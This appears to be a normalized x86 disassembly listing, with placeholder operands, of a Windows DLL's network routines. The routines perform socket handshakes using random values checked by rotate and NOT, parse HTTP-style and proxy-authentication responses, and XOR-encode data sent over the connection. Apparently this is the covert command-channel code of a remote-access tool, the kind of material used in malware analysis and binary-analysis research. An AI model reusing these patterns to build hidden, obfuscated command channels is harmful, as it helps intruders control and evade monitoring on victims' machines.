jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov eax [ ebp - 0x6c ]
lea ecx [ ebx + eax ]
add ecx [ ebp - 0x78 ]
mov eax [ ebp - 0x68 ]
lea ecx [ ecx + eax + 0x30 ]
cmp ecx 0x400
jb r-xdata
mov esi [ memcpy@IAT ]
push eax
lea eax [ edi + ebx ]
push r--data
push eax
call esi
push [ ebp - 0x6c ]
add ebx [ ebp - 0x68 ]
push [ ebp - 0x88 ]
lea eax [ edi + ebx ]
push eax
call esi
push [ ebp - 0x78 ]
add ebx [ ebp - 0x6c ]
push r--data
lea eax [ edi + ebx ]
push eax
call esi
add ebx [ ebp - 0x78 ]
push 0x18
lea eax [ ebp - 0x4c ]
push eax
lea eax [ edi + ebx ]
push eax
call esi
push 0x18
lea eax [ ebp - 0x64 ]
push eax
lea eax [ edi + ebx + 0x18 ]
push eax
call esi
add ebx 0x30
mov eax ebx
add esp 0x3c
sar eax 0x8
mov [ edi + 0x39 ] al
mov [ edi + 0x38 ] bl
mov eax ebx
or eax 0xffffffff
jmp r-xdata
sub_1000ae07
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi ecx
push eax
mov eax [ ebp + 0xc ]
mov edi esi
call sub_1000a457
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
xor edi edi
call [ rand@IAT ]
mov [ ebp + edi * 4 - 0x44 ] eax
inc edi
cmp edi 0x10
jb r-xdata
mov eax [ ebp - 0x44 ]
push 0x0
push 0x40
mov ecx eax
ror eax 0x7
pop edi
mov [ ebp - 0x3c ] eax
push edi
lea eax [ ebp - 0x44 ]
push eax
not ecx
push ebx
mov [ ebp - 0x40 ] ecx
call [ send@IAT ]
cmp eax edi
jne r-xdata
push ebx
call [ closesocket@IAT ]
push 0x7d0
call sub_10008fbd
test eax eax
jle r-xdata
push 0x0
push edi
lea eax [ ebp - 0x44 ]
push eax
push ebx
call [ recv@IAT ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x44 ]
mov ecx eax
not ecx
cmp [ ebp - 0x40 ] ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov [ esi + 0x4 ] 0xd
ror eax 0x7
cmp [ ebp - 0x3c ] eax
jne r-xdata
mov [ esi + 0x10c ] ebx
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x8
sub_1000aed5
push ebp
mov ebp esp
sub esp 0xd2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
mov [ ebp - 0xd20 ] ecx
mov ecx [ ebp + 0x10 ]
mov edi edx
mov [ ebp - 0x8 ] eax
push eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xd10 ] edi
mov [ ebp - 0xd28 ] ecx
mov [ ebp - 0xd1c ] esi
call sub_1000a457
mov [ ebp - 0xd14 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x14
push ebx
push 0x100
lea eax [ edi + 0x8 ]
push esi
push eax
call [ strncpy@IAT ]
mov eax [ ebp + 0x18 ]
push eax
push esi
push eax
push esi
push r--data
mov [ edi + 0x108 ] eax
mov ebx 0x400
lea eax [ ebp - 0x40c ]
push ebx
push eax
mov [ edi + 0x107 ] 0x0
call [ _snprintf@IAT ]
mov esi [ strlen@IAT ]
add esp 0x28
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ send@IAT ]
mov edi eax
lea eax [ ebp - 0x40c ]
push eax
call esi
pop ecx
cmp edi eax
jne r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0xd10 ]
mov [ ecx + 0x4 ] eax
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
call [ closesocket@IAT ]
jmp r-xdata
lea eax [ ebp - 0x40c ]
push eax
mov [ ebp - 0xd ] 0x0
call esi
pop ecx
cmp eax 0xf
jb r-xdata
xor eax eax
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
jmp r-xdata
mov edi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call edi
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0xd14 ]
jmp r-xdata
lea eax [ ebp - 0x403 ]
push eax
call [ atoi@IAT ]
pop ecx
test eax eax
jne r-xdata
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call edi
add esp 0xc
test eax eax
jne r-xdata
cmp eax 0xc8
jne r-xdata
push [ ebp - 0xd14 ]
cmp eax 0x197
je r-xdata
mov ecx [ ebp - 0xd10 ]
mov eax [ ebp - 0xd14 ]
mov [ ecx + 0x10c ] eax
jmp r-xdata
call [ closesocket@IAT ]
and [ ebp - 0xd2c ] 0x0
and [ ebp - 0xd24 ] 0x0
mov edi r--data
lea eax [ ebp - 0x40c ]
push edi
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0xd18 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
jmp r-xdata
pop ebx
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
push 0x5
push r--data
push edi
call esi
add eax [ ebp - 0xd18 ]
pop ecx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
push 0x9
push r--data
push edi
call esi
add eax [ ebp - 0xd18 ]
pop ecx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov [ ebp - 0xd2c ] 0x1
jmp r-xdata
mov eax [ ebp - 0xd18 ]
inc eax
push edi
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0xd18 ] eax
test eax eax
jne r-xdata
mov [ ebp - 0xd24 ] 0x1
cmp [ ebp - 0xd2c ] eax
je r-xdata
cmp [ ebp - 0xd24 ] 0x0
je r-xdata
mov eax [ ebp - 0xd20 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd20 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0x4dc
cmp [ eax ] 0x0
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0xd10 ]
call sub_1000a457
mov [ ebp - 0xd14 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0xd10 ]
call sub_1000a457
mov [ ebp - 0xd14 ] eax
test eax eax
je r-xdata
push [ ebp - 0xd28 ]
mov edi [ _snprintf@IAT ]
push [ ebp - 0xd20 ]
lea eax [ ebp - 0x48c ]
push r--data
push 0x80
push eax
call edi
add esp 0x14
lea eax [ ebp - 0x50c ]
push eax
lea eax [ ebp - 0x48c ]
push eax
mov [ ebp - 0x40d ] 0x0
call esi
pop ecx
lea ecx [ ebp - 0x48c ]
call sub_100076da
lea eax [ ebp - 0x50c ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40c ]
push [ ebp - 0xd1c ]
push [ ebp + 0x18 ]
push [ ebp - 0xd1c ]
push r--data
push ebx
push eax
call edi
add esp 0x24
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ send@IAT ]
mov edi eax
lea eax [ ebp - 0x40c ]
push eax
call esi
pop ecx
cmp edi eax
je r-xdata
lea eax [ ebp - 0x90c ]
push eax
call sub_1000ab06
lea ecx [ ebp - 0xd0c ]
push ecx
lea ecx [ ebp - 0x90c ]
call sub_100076da
lea eax [ ebp - 0xd0c ]
push eax
push [ ebp + 0x18 ]
mov edi r--data
push [ ebp - 0xd1c ]
lea eax [ ebp - 0x40c ]
push [ ebp + 0x18 ]
push [ ebp - 0xd1c ]
push edi
push ebx
push eax
call [ _snprintf@IAT ]
add esp 0x28
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ send@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ ebp - 0xd14 ]
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push edi
call [ recv@IAT ]
test eax eax
jg r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push [ ebp - 0xd14 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0xd10 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x40c ]
push eax
mov [ ebp - 0xd ] 0x0
call esi
pop ecx
cmp eax 0xf
jb r-xdata
call [ GetLastError@IAT ]
mov ecx [ ebp - 0xd10 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
mov [ ebp - 0xd ] 0x0
call [ strstr@IAT ]
pop ecx
pop ecx
mov [ ebp - 0xd18 ] eax
test eax eax
je r-xdata
xor esi esi
mov eax [ ebp - 0xd10 ]
mov [ eax + 0x4 ] 0xd
mov esi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
push edi
push r--data
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x403 ]
push eax
call [ atoi@IAT ]
pop ecx
test eax eax
jne r-xdata
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
push r--data
call esi
add [ ebp - 0xd18 ] eax
mov [ esp ] r--data
push [ ebp - 0xd18 ]
call [ strstr@IAT ]
lea eax [ ebp - 0x90c ]
push eax
mov eax [ ebp - 0xd18 ]
call sub_100077c9
lea eax [ ebp - 0x90c ]
push r--data
push eax
call [ strcmp@IAT ]
add esp 0x14
test eax eax
jne r-xdata
cmp eax 0xc8
mov eax [ ebp - 0xd10 ]
jne r-xdata
cmp [ ebp - 0x904 ] 0x2
jne r-xdata
mov [ eax + 0x4 ] 0x4dc
mov esi edi
jmp r-xdata
mov [ eax + 0x10c ] edi
mov eax edi
jmp r-xdata
push 0x8
lea eax [ ebp - 0x8f4 ]
push eax
lea eax [ ebp - 0xc ]
push eax
call [ memcpy@IAT ]
mov ecx [ ebp - 0xd28 ]
add esp 0xc
push [ ebp - 0xd20 ]
lea eax [ ebp - 0x90c ]
push eax
lea edx [ ebp - 0xc ]
call sub_1000aba3
lea ecx [ ebp - 0xd0c ]
push ecx
lea ecx [ ebp - 0x90c ]
call sub_100076da
lea eax [ ebp - 0xd0c ]
push eax
push [ ebp + 0x18 ]
lea eax [ ebp - 0x40c ]
push [ ebp - 0xd1c ]
push [ ebp + 0x18 ]
push [ ebp - 0xd1c ]
push edi
push ebx
push eax
call [ _snprintf@IAT ]
add esp 0x2c
lea eax [ ebp - 0x40c ]
push 0x0
push eax
call esi
mov edi [ ebp - 0xd14 ]
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push eax
push edi
call [ send@IAT ]
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0xd14 ]
call [ closesocket@IAT ]
mov eax esi
jmp r-xdata
push 0x0
push ebx
lea eax [ ebp - 0x40c ]
push eax
push edi
call [ recv@IAT ]
test eax eax
jle r-xdata
lea eax [ ebp - 0x40c ]
push eax
mov [ ebp - 0xd ] 0x0
call esi
pop ecx
cmp eax 0xf
jb r-xdata
mov esi [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
push 0x9
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_1000b59a
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
mov edi ecx
mov [ ebp - 0x40c ] ecx
call sub_1000a457
mov [ ebp - 0x408 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x8
push ebx
push [ ebp + 0xc ]
mov ebx 0x400
push esi
push r--data
lea eax [ ebp - 0x404 ]
push ebx
push eax
call [ _snprintf@IAT ]
mov edi [ strlen@IAT ]
add esp 0x14
lea eax [ ebp - 0x404 ]
push 0x0
push eax
call edi
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push [ ebp - 0x408 ]
call [ send@IAT ]
mov esi eax
lea eax [ ebp - 0x404 ]
push eax
call edi
pop ecx
cmp esi eax
jne r-xdata
push [ ebp - 0x408 ]
jmp r-xdata
mov esi [ ebp - 0x40c ]
push 0x2710
call sub_10008fbd
test eax eax
jne r-xdata
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
mov esi [ ebp - 0x408 ]
push 0x0
push ebx
lea eax [ ebp - 0x404 ]
push eax
push esi
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax esi
push [ eax + 0x10c ]
jmp r-xdata
pop ebx
push esi
mov ebx r--data
push ebx
mov [ ebp - 0x5 ] 0x0
call edi
push eax
push ebx
mov ebx [ strncmp@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call ebx
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
mov esi r--data
push esi
call edi
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
call ebx
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x40c ]
mov [ eax + 0x10c ] esi
mov eax esi
mov esi [ ebp - 0x408 ]
sub_1000b6f1
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x18 ]
push edi
push edx
push [ ebp + 0xc ]
mov [ ebp - 0x40c ] ecx
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x40c ]
push eax
call sub_1000aed5
mov [ ebp - 0x408 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_10014571
leave
retn 0x18
push ebx
push esi
push [ ebp + 0x1c ]
mov ebx 0x400
push edi
push r--data
lea eax [ ebp - 0x404 ]
push ebx
push eax
call [ _snprintf@IAT ]
mov edi [ strlen@IAT ]
add esp 0x14
lea eax [ ebp - 0x404 ]
push 0x0
push eax
call edi
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push [ ebp - 0x408 ]
call [ send@IAT ]
mov esi eax
lea eax [ ebp - 0x404 ]
push eax
call edi
pop ecx
cmp esi eax
jne r-xdata
push [ ebp - 0x408 ]
mov esi [ ebp - 0x40c ]
push 0x2710
call sub_10008fbd
test eax eax
jne r-xdata
pop esi
pop ebx
push 0x0
push ebx
lea eax [ ebp - 0x404 ]
push eax
push [ ebp - 0x408 ]
call [ recv@IAT ]
test eax eax
jle r-xdata
mov eax esi
push [ eax + 0x10c ]
jmp r-xdata
mov ebx r--data
push ebx
mov [ ebp - 0x5 ] 0x0
call edi
push eax
push ebx
mov ebx [ strncmp@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call ebx
add esp 0x10
test eax eax
je r-xdata
call [ closesocket@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x40c ]
mov eax [ ebp - 0x408 ]
mov [ ecx + 0x10c ] eax
mov esi r--data
push esi
call edi
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
call ebx
add esp 0x10
test eax eax
je r-xdata
sub_1000b839
push ebp
mov ebp esp
sub esp 0x104
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x18 ]
push edi
push edx
push [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0x10 ]
push eax
mov edx esi
call sub_1000aed5
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
xor edi edi
call [ rand@IAT ]
mov [ ebp + edi * 4 - 0x104 ] eax
inc edi
cmp edi 0x40
jb r-xdata
mov eax [ ebp - 0x104 ]
mov ecx eax
ror eax 0x7
push 0x0
mov [ ebp - 0xfc ] eax
mov edi 0x100
push edi
lea eax [ ebp - 0x104 ]
push eax
not ecx
push ebx
mov [ ebp - 0x100 ] ecx
call [ send@IAT ]
cmp eax edi
jne r-xdata
push ebx
call [ closesocket@IAT ]
push 0x7d0
call sub_10008fbd
test eax eax
jle r-xdata
push 0x0
push edi
lea eax [ ebp - 0x104 ]
push eax
push ebx
call [ recv@IAT ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x104 ]
mov ecx eax
not ecx
cmp [ ebp - 0x100 ] ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov [ esi + 0x4 ] 0xd
ror eax 0x7
cmp [ ebp - 0xfc ] eax
jne r-xdata
mov [ esi + 0x10c ] ebx
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x18
sub_1000b935
push ebp
mov ebp esp
sub esp 0x198
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x198 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x190 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x194 ] eax
mov eax [ ebp + 0x18 ]
push esi
mov [ ebp - 0x188 ] eax
push edi
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x18c ]
push eax
lea eax [ ebp - 0x184 ]
xor edi edi
push eax
mov esi ecx
mov [ ebp - 0x184 ] 0x0
mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x44 ] 0x0
mov [ ebp - 0x18c ] edi
call sub_1001163d
mov ebx [ Sleep@IAT ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
test eax eax
je r-xdata
cmp [ ebp - 0x184 ] 0x0
je r-xdata
test edi edi
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x18c ] edi
je r-xdata
mov eax edi
jmp r-xdata
push 0x1388
call ebx
push [ ebp + 0x1c ]
mov eax [ esi ]
push [ ebp - 0x188 ]
mov ecx esi
call [ eax + 0x10 ]
mov edi eax
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ebp + 0x1c ]
mov eax [ esi ]
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ ebp - 0x84 ]
push ecx
push [ ebp - 0x18c ]
lea ecx [ ebp - 0x184 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
mov edi eax
test edi edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x18
push 0x1388
call ebx
push [ ebp + 0x1c ]
mov eax [ esi ]
push [ ebp - 0x188 ]
mov ecx esi
call [ eax + 0xc ]
mov edi [ strncpy@IAT ]
push 0x100
push eax
lea eax [ ebp - 0x184 ]
push eax
call edi
push 0x40
push [ ebp - 0x190 ]
lea eax [ ebp - 0x84 ]
push eax
call edi
push 0x40
push [ ebp - 0x194 ]
lea eax [ ebp - 0x44 ]
push eax
call edi
mov eax [ esi ]
add esp 0x24
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x44 ]
push [ ebp - 0x188 ]
push ecx
lea ecx [ ebp - 0x84 ]
push ecx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x184 ]
push ecx
mov ecx esi
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0x1388
call ebx
push [ ebp + 0x1c ]
mov eax [ esi ]
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ ebp - 0x84 ]
push ecx
push [ ebp - 0x18c ]
lea ecx [ ebp - 0x184 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
mov edi eax
test edi edi
je r-xdata
push 0x1388
call ebx
push [ ebp + 0x1c ]
mov eax [ esi ]
push [ ebp - 0x188 ]
lea ecx [ ebp - 0x44 ]
push ecx
lea ecx [ ebp - 0x84 ]
push ecx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x184 ]
push ecx
mov ecx esi
call [ eax + 0x18 ]
test eax eax
je r-xdata
jmp r-xdata
sub_1000bb35
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
shr eax 0x4
lea eax [ eax + edi + 0x5f ]
push eax
mov [ ebp - 0x4 ] ecx
call [ malloc@IAT ]
mov esi eax
xor ebx ebx
pop ecx
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ebx
cmp [ rw-data ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
add eax 0x114
push eax
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
push eax
lea ebx [ esi + 0x18 ]
push ebx
mov eax edi
call sub_10013818
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push 0x10000
add eax 0x114
push ebx
push eax
mov [ rw-data ] 0x1
call [ memset@IAT ]
add esp 0xc
pop edi
pop esi
pop ebx
leave
retn 0xc
and [ esi + 0x10 ] 0x0
push edi
push [ ebp + 0xc ]
push ebx
call [ memcpy@IAT ]
add esp 0xc
add edi 0x18
mov [ esi ] edi
mov eax [ ebp + 0x10 ]
cmp eax edi
jae r-xdata
add eax 0xffffffeb
xor ecx ecx
test eax 0xfffffffc
jbe r-xdata
mov edx [ esi + 0x8 ]
add eax 0x18
mov [ esi + 0x10 ] 0x1
mov [ esi + 0x14 ] edi
mov [ esi ] eax
jmp r-xdata
push [ esi ]
mov edi [ ebp - 0x4 ]
push esi
call sub_1000a5f9
mov edi eax
test edi edi
jle r-xdata
mov eax [ esi + 0xc ]
xor [ ebx ] eax
mov eax [ esi ]
sub eax 0x15
inc ecx
shr eax 0x2
add ebx 0x4
cmp ecx eax
jb r-xdata
movzx edi [ ebx + ecx ]
add edx edi
inc ecx
lea edi [ eax - 0x18 ]
mov [ esi + 0x8 ] edx
cmp ecx edi
jb r-xdata
mov edi [ rand@IAT ]
call edi
mov [ ebp + 0xc ] eax
shl [ ebp + 0xc ] 0x10
call edi
or eax [ ebp + 0xc ]
xor ecx ecx
mov [ esi + 0xc ] eax
mov eax [ esi ]
lea edx [ eax - 0x18 ]
test edx edx
je r-xdata
push esi
call [ free@IAT ]
pop ecx
mov eax edi
mov edi [ esi ]
sub_1000bc65
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp + 0xc ]
push esi
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
push 0x18
mov esi ecx
mov [ ebp - 0xa4 ] eax
pop eax
lea ecx [ ebp - 0x9c ]
call sub_1000a656
test eax eax
jg r-xdata
push ebx
mov ebx [ ebp - 0x9c ]
cmp ebx 0x18
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push edi
cmp ebx 0x6400000
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0xc
push ebx
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
lea edi [ ebx - 0x18 ]
test edi edi
je r-xdata
pop ebx
or eax 0xffffffff
push ebx
push 0x0
push edi
call [ memset@IAT ]
mov eax [ ebp - 0x9c ]
add esp 0xc
add eax 0xffffffe8
mov ecx edi
call sub_1000a656
test eax eax
jg r-xdata
xor eax eax
jmp r-xdata
push 0x0
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push [ esi + 0x10c ]
call [ recv@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x9c ]
lea edx [ eax - 0x15 ]
xor ebx ebx
xor ecx ecx
test edx 0xfffffffc
jbe r-xdata
push edi
call [ free@IAT ]
jmp r-xdata
pop edi
call [ GetLastError@IAT ]
mov [ esi + 0x4 ] eax
jmp r-xdata
test eax eax
je r-xdata
lea ecx [ eax - 0x18 ]
xor edx edx
cmp ecx ebx
jbe r-xdata
mov eax [ ebp - 0x90 ]
xor [ edi + ecx * 4 ] eax
mov eax [ ebp - 0x9c ]
lea edx [ eax - 0x15 ]
inc ecx
shr edx 0x2
cmp ecx edx
jb r-xdata
pop ecx
sub edi eax
jne r-xdata
cmp [ ebp - 0x94 ] ebx
jne r-xdata
movzx esi [ edx + edi ]
sub [ ebp - 0x94 ] esi
inc edx
cmp edx ecx
jb r-xdata
cmp [ ebp - 0x8c ] ebx
jne r-xdata
xor ebx ebx
push [ ebp - 0x88 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0xa4 ]
mov [ edx ] ecx
mov ecx [ ebp - 0xa0 ]
mov edx [ ebp - 0xa8 ]
mov [ ecx ] edi
mov ecx [ ebp - 0x98 ]
mov [ edx ] ecx
jmp r-xdata
push [ ebp - 0x88 ]
push ebx
push esi
call [ memset@IAT ]
add esp 0xc
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x9c ]
push esi
add eax 0xffffffe8
mov ecx edi
mov [ ebp - 0xac ] ebx
call sub_100138e7
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
push edi
mov edi [ free@IAT ]
call edi
push esi
call edi
pop ecx
mov ebx [ ebp - 0xac ]
cmp ebx [ ebp - 0x88 ]
jne r-xdata
push edi
call [ free@IAT ]
mov eax [ ebp - 0xa4 ]
mov [ eax ] ebx
mov eax [ ebp - 0xa0 ]
mov [ eax ] esi
mov eax [ ebp - 0x98 ]
pop ecx
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x9c ]
jmp r-xdata
sub_1000be87
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
ror ecx 0x7
cmp [ eax + 0x8 ] ecx
jne r-xdata
xor eax eax
push edi
xor edi edi
call [ rand@IAT ]
mov [ ebp + edi * 4 - 0x44 ] eax
inc edi
cmp edi 0x10
jb r-xdata
mov eax [ ebp - 0x44 ]
mov ecx eax
ror eax 0x7
push 0x0
mov [ ebp - 0x3c ] eax
push 0x40
lea eax [ ebp - 0x44 ]
push eax
push [ esi + 0x10c ]
not ecx
mov [ ebp - 0x40 ] ecx
call [ send@IAT ]
pop edi
cmp eax 0x40
je r-xdata
mov eax [ esi + 0x10c ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10014571
leave
retn 0x4
sub_1000befe
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push r--data
push eax
xor esi esi
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x4
push ebx
push r--data
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call [ _snprintf@IAT ]
add esp 0xc
push esi
mov esi [ strlen@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push [ edi + 0x10c ]
call [ send@IAT ]
mov ebx eax
lea eax [ ebp - 0x404 ]
push eax
call esi
pop ecx
cmp ebx eax
pop ebx
je r-xdata
mov esi [ edi + 0x10c ]
or esi 0xffffffff
jmp r-xdata
sub_1000bf96
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
mov ebx esi
mov [ ebp - 0x40c ] esi
call sub_1000a331
mov edi eax
xor ebx ebx
mov [ ebp - 0x408 ] edi
cmp edi ebx
je r-xdata
xor eax eax
push 0x2710
call sub_10008fbd
test eax eax
jne r-xdata
push ebx
push 0x100
lea eax [ ebp - 0x404 ]
push eax
push edi
call [ recv@IAT ]
cmp eax ebx
jle r-xdata
push edi
jmp r-xdata
mov [ ebp + eax - 0x404 ] bl
